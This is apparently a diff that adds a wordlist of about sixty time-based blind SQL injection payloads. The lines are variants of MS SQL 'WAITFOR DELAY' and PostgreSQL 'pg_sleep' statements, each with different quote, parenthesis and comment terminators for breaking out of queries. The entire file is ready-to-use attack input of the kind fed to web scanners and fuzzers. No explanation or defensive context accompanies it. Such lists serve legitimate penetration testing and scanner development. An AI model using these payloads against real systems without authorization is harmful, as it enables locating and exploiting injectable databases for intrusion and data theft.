@@ -1,0 +1,64 @@
+;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+';%5waitfor%5delay%5'0:0:5'%5--%5
+' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'
+or WAITFOR DELAY '0:0:5'--
+or WAITFOR DELAY '0:0:5'
+and WAITFOR DELAY '0:0:5'--
+and WAITFOR DELAY '0:0:5'
+WAITFOR DELAY '0:0:5'
+;WAITFOR DELAY '0:0:5'--
+;WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'-- 1337
+1' WAITFOR DELAY '0:0:5' AND '1337'='1337
+1') WAITFOR DELAY '0:0:5' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:5' AND (1337=1337
+') WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+')) WAITFOR DELAY '0:0:5'--
+'))) WAITFOR DELAY '0:0:5'--
+%' WAITFOR DELAY '0:0:5'--
+") WAITFOR DELAY '0:0:5'--
+")) WAITFOR DELAY '0:0:5'--
+"))) WAITFOR DELAY '0:0:5'--
+";SELECT pg_sleep(5);
+;SELECT pg_sleep(5);
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+' SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+' SELECT pg_sleep(5);
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
